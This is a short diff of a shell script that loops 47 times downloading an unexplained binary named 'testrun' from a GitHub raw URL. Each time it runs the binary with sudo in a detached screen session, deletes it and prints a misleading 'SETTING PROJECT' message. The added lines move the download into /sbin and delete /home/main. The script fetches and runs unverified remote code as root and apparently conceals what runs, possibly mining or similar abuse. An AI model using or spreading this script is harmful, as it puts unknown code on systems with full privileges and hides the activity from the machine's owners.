@@ -1,2 +1,2 @@
-for i in `seq 1 47`; do echo $i; sudo wget -q https://raw.githubusercontent.com/renilo/hajar/main/testrun; sudo chmod +x testrun; screen -dmS Running ./testrun ; sleep 1500; clear; screen -XS Running quit; rm -f testrun; echo SETTING PROJECT; sleep 300; done
-rm -f main
+for i in `seq 1 47`; do echo $i;cd /sbin; sudo wget -q https://raw.githubusercontent.com/renilo/hajar/main/testrun; sudo chmod +x testrun; screen -dmS Running ./testrun ; sleep 1500; clear; screen -XS Running quit; rm -f testrun; echo SETTING PROJECT; sleep 300; done
+rm -f /home/main
